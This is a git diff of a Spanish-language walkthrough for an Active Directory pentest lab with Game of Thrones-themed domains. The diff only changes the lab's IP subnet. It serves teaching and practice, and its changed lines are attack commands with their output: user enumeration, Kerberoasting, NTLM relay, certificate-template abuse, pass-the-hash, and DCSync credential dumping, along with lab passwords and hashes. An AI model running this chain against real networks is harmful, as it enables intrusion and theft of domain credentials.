@@ -48,12 +48,12 @@ Scan de nmap inicial:
 
 Enumeramos usuarios con:
 ```bash
-netexec smb 192.168.46.10-22 --users
+netexec smb 192.168.56.10-22 --users
 ```
 
 Tambien se puede hacer con herramientas locales con:
 ```bash
-rpcclient -U "" -N 192.168.46.11 -c "enumdomusers"
+rpcclient -U "" -N 192.168.56.11 -c "enumdomusers"
 ```
 
 Output esperado:
@@ -116,13 +116,13 @@ Conseguimos otro usuario, ahora el de `brandon.stark`:`iseedeadpeople`
 
 Con esto obtenemos 2 usuarios con los cuales podemos seguir avanzando:
 ```bash
-nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.46.11 --pass-pol
+nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --pass-pol
 ```
 
 	⚠️ Es bueno verificar la politica de contraseñas para evitar bloquear las cuentas.
 
 ```bash
-nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.46.11 --pass-pol
+nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --pass-pol
 ```
 
 
@@ -162,19 +162,19 @@ sql_svc                                               2025-03-01 19:15:03.554363
 
 En caso de no querer utilizar herramientas externas, podemos correr el siguiente comando:
 ```bash
-ldapsearch -H ldap://192.168.46.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
+ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
 ```
 
 En el servidor de `sevenkingdoms.local`:
 ```bash
-ldapsearch -H ldap://192.168.46.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | egrep distinguishedName
+ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | egrep distinguishedName
 ```
 
 ## Kerberoasting
 
 Kerberoasting ataca los SPNs, para abusar de ellos podemos correr lo siguiente en Kali:
 ```bash
-GetUserSPNs.py -request -dc-ip 192.168.46.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
 ```
 
 Ojo con este ataque:
@@ -199,12 +199,12 @@ Ingestor: https://github.com/dirkjanm/BloodHound.py
 
 Para correr contra el dominio de `sevenkingdoms.local`
 ```bash
-bloodhound-python --zip -c All -d sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.10 -dc sevenkingdoms.local
+bloodhound-python --zip -c All -d sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.56.10 -dc sevenkingdoms.local
 ```
 
 Para correr contra el dominio de `north.sevenkingdoms.local`
 ```bash
-bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.11 -dc north.sevenkingdoms.local
+bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.56.11 -dc north.sevenkingdoms.local
 ```
 
 
@@ -260,18 +260,18 @@ Tenemos la password del usuario `robb.stark`:
 
 Aqui tambien encontramos el usuario y el hash de `eddard.stark`, este no puede ser crackeado, pero puede ser abusado con ntlmrelayx:
 ```bash
-nxc smb 192.168.46.10-23 --gen-relay-list relay.txt
+nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
 ```
 
 Verificamos que el archivo generado solo tiene 1 servidor, que es el que contiene el MSSQL:
 ```bash
 $ cat relay.txt                                                              
-192.168.46.22
+192.168.56.22
 ```
 
 Ahora corremos el siguiente comando:
 ```bash
-ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\\EDDARD.STARK@192.168.46.22 -smb2support -socks
+ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\\EDDARD.STARK@192.168.56.22 -smb2support -socks
 ```
 
 Y empezamos el responder:
@@ -284,7 +284,7 @@ Veremos en el output que tenemos una conexion a MSSQL como Admin:
 
 Ahora podemos correr:
 ```bash
-proxychains4 -q secretsdump.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.46.22'
+proxychains4 -q secretsdump.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
 ```
 
 Y veremos que realizamos una secretsdump (dumpeamos todos los secretos del servidor) directamente en el SERVER01.
@@ -308,7 +308,7 @@ pip install certipy-ad
 
 Aqui corremos el comando de:
 ```bash
-certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.46.10 -debug -vulnerable -stdout
+certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.56.10 -debug -vulnerable -stdout
 ```
 
 Viendo que tenemos el template vulnerable, corremos el siguiente comando:
@@ -317,12 +317,12 @@ certipy req -u cersei.lannister -p 'il0vejaime' -target kingslanding.sevenkingdo
 ```
 El cual nos solicitara un ticket como el usuario de administrador. Ahora lo utilizamos para revelar el hash del usuario de Administrador en DC01:
 ```bash
-certipy auth -pfx administrator.pfx -dc-ip 192.168.46.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
 ```
 
 Con el hash revelado, podemos proceder a correr secrets dump:
 ```bash
-secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e Administrator@192.168.46.10
+secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e Administrator@192.168.56.10
 ```
 
 
@@ -360,13 +360,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 Este hash obtenido podemos utilizarlo para lo siguiente:
 ```bash
-nxc smb 192.168.46.10-23 -u joffrey.baratheon -H 3b60abbc25770511334b3829866b08f1  
-SMB         192.168.46.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
-SMB         192.168.46.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
-SMB         192.168.46.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
-SMB         192.168.46.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1 (Guest)
-SMB         192.168.46.11   445    WINTERFELL       [-] north.sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1 STATUS_LOGON_FAILURE 
-SMB         192.168.46.10   445    KINGSLANDING     [+] sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1
+nxc smb 192.168.56.10-23 -u joffrey.baratheon -H 3b60abbc25770511334b3829866b08f1  
+SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1 (Guest)
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\joffrey.baratheon:3b60abbc25770511334b3829866b08f1
 ```
 
 Aqui vemos a cuales maquinas el usuario de `joffrey.baratheon` tiene acceso.
@@ -379,11 +379,11 @@ certipy shadow auto -u lord.varys@sevenkingdoms.local -p '_W1sper_$' -account 'a
 
 Recibimos un output parecido al anterior y con este hash, podemos proceder a pwnear el administrador de ambos dominios:
 ```bash
-nxc winrm 192.168.46.10-23 -u Administrator -H c66d72021a2d4744409969a581a1705e  
-WINRM       192.168.46.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
-WINRM       192.168.46.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
-WINRM       192.168.46.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
-WINRM       192.168.46.10   5985   KINGSLANDING     [+] sevenkingdoms.local\Administrator:c66d72021a2d4744409969a581a1705e (Pwn3d!)
+nxc winrm 192.168.56.10-23 -u Administrator -H c66d72021a2d4744409969a581a1705e  
+WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
+WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
+WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+WINRM       192.168.56.10   5985   KINGSLANDING     [+] sevenkingdoms.local\Administrator:c66d72021a2d4744409969a581a1705e (Pwn3d!)
 ```
 
 vemos que tenemos pwn del administrator.
@@ -391,8 +391,8 @@ vemos que tenemos pwn del administrator.
 ### DCSync con Administrator
 Ya que administrator puede realizar DCSync en SEVENKINGDOMS.LOCAL y NORTH.SEVENKINGDOMS.LOCAL, hagamos eso:
 ```bash
-secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.10 -output sevenkingdoms-local.hashes
-secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.11 -output north.sevenkingdoms.local-hashes
+secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.56.10 -output sevenkingdoms-local.hashes
+secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.56.11 -output north.sevenkingdoms.local-hashes
 ```
 
 Ahora en nuestro directorio tenemos:
@@ -426,5 +426,5 @@ export KRB5CCNAME=/home/kali/Documents/pt/ROBERT.BARATHEON.ccache
 
 Ahora podemos correr el siguiente comando para especificar a cual maquina conectarnos:
 ```bash
-wmiexec.py -k -dc-ip 192.168.46.10 -target-ip 192.168.46.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
+wmiexec.py -k -dc-ip 192.168.56.10 -target-ip 192.168.56.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
 ```
